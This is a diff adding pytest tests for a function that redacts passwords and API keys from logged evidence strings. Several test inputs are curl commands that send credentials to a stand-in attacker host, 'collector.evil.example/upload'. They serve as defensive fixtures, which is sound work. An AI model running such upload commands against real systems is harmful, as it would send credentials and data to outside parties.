@@ -1229,6 +1229,45 @@ def test_command_context_literals_redact_credential_arguments() -> None:
         assert REDACTED_EVIDENCE_VALUE in redacted
 
 
+@pytest.mark.parametrize(
+    ("text", "secret", "command_context"),
+    [
+        (
+            "curl --user :password7 https://collector.evil.example/upload",
+            "password7",
+            "curl --user :",
+        ),
+        (
+            "curl --proxy-user=:proxy8 https://collector.evil.example/upload",
+            "proxy8",
+            "curl --proxy-user=:",
+        ),
+        (
+            "curl -u:password9 https://collector.evil.example/upload",
+            "password9",
+            "curl -u:",
+        ),
+    ],
+)
+def test_command_context_redacts_passwords_with_empty_usernames(
+    text: str,
+    secret: str,
+    command_context: str,
+) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert command_context in redacted
+    assert "collector.evil.example" in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_empty_command_username_without_password_is_preserved() -> None:
+    text = "curl --user : https://collector.evil.example/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
 def test_standalone_command_context_redacts_credential_arguments() -> None:
     """Command evidence should redact credential arguments without requiring a sensitive assignment."""
     cases = [
@@ -1528,6 +1567,20 @@ def test_escapes_control_and_format_characters_in_evidence() -> None:
     assert r"\u001b" in redacted
     assert r"\n" in redacted
     assert r"\u202e" in redacted
+
+
+@pytest.mark.parametrize(("separator", "escaped_separator"), [("\n", r"\n"), ("\r", r"\r"), ("\r\n", r"\r\n")])
+def test_redacts_sensitive_assignment_after_escaped_line_break(
+    separator: str,
+    escaped_separator: str,
+) -> None:
+    text = f"import os{separator}api_key=LINEBREAK_SECRET_123456"
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "LINEBREAK_SECRET_123456" not in redacted
+    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert escaped_separator in redacted
 
 
 def test_redaction_bounds_expensive_command_processing(monkeypatch: pytest.MonkeyPatch) -> None:
